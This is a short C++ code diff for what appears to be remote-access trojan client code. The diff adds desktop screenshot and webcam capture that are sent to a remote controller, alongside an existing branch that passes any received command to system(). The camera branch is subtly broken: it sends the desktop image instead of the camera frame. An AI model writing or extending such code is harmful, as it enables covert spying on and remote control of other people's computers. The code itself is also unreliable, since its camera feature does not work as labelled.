@@ -76,7 +76,11 @@ cv::Mat hwnd2mat(HWND hwnd) {
 
 void rcv() {
     DataType dt;
-    cv::Mat image;
+    HWND DesktopWindow = GetDesktopWindow();
+    cv::VideoCapture cap(0);
+    system("cls");
+    cv::Mat Dimage;
+    cv::Mat Cimage;
     INPUT in;
 
     while (true) {
@@ -293,16 +297,19 @@ void rcv() {
             NH.RecvDataT<std::string>(&command);
             system(command.c_str());
         }
-        else if (dt.Name == "DataTypeList") {
-            NH.RecvTypeList();
-        }
         else if (dt.Name == "DesktopIMG")
         {
+        printf("recved request");
             //send desktop image
-
+            Dimage = hwnd2mat(DesktopWindow);
+            NH.SendDataType("DesktopIMG");
+            NH.SendCVMat(Dimage);
         }
         else if (dt.Name == "CamIMG") {
             //send cam image
+            cap.read(Cimage);
+            NH.SendDataType("DesktopIMG");
+            NH.SendCVMat(Dimage);
         }
         else if (dt.Name == "RecvPopUp") {
 
